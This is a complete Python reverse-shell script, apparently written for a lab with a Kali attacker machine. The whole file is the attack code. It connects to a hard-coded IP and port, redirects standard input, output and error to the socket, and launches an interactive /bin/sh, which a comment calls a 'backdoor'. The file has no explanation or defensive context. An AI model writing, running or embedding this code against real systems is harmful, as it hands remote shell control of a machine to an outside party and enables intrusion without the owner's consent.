import socket, subprocess, os

# this is my kali ip, might be different from yours
kali_ip = "10.0.2.5" # Please change accordingly
lport = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, lport))

os.dup2(s.fileno(), 0) # stdin
os.dup2(s.fileno(), 1) # stdout
os.dup2(s.fileno(), 2) # stderr

subprocess.call(["/bin/sh", "-i"]) # backdoor

s.close()
